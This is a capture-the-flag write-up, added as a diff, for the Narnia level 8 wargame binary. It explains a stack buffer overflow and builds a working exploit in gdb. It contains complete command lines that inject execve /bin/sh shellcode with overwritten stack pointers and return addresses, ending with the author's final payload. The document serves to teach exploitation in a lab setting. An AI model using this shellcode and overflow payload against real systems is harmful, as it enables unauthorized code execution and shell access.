@@ -1,0 +1,33 @@
+Upon examining the code, there is buffer overflow in the for loop inside func(char *b)
+
+Upon first dabbeling I sent the program the following string:
+./narnia8 $(python -c 'print "A" * 20 + "B" * 20 ')
+
+The interesting thing here is you'd assume that you'd get an output of 20 A's and 20 B's, but the results I 
+found were a little different. 
+The outputs always had the initial 20 A values, but only sometimes would have the first B values. 
+In addition on rare circumstance, the program would actually segfault like expected. 
+
+My assumption is that in the writing to memory, we are accidently modifying variables such as the 'i' increment variable
+
+The first vaule that we are clobbering is our pointer to the arg value, so we need to preserve that first.
+
+This next string does the following in gdb:
+1. fill the 20 byte buffer with A's
+2. Replace the 2 variable addresses that followed the byte array on the stack
+3. The address of where our shellcode is going to be
+4. Our shellcode
+gdb --args ./narnia8 $(python -c 'print "A" * 20 + "\x63\xd8\xff\xff\x88\xd6\xff\xff" + "\x84\xd6\xff\xff" + 
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+
+Now the final challenge is getting the addresses we need to address is finding the locations on the stack
+outside of the GDB enviroment
+
+I did my work by adjusting the values manually, but you can do a more complex problem using automated python scripts
+The final code I used was
+./narnia8 $(python -c 'print "A" * 20 + "\x81\xd8\xff\xff" * 2 + "\xa1\xd8\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+
+
+
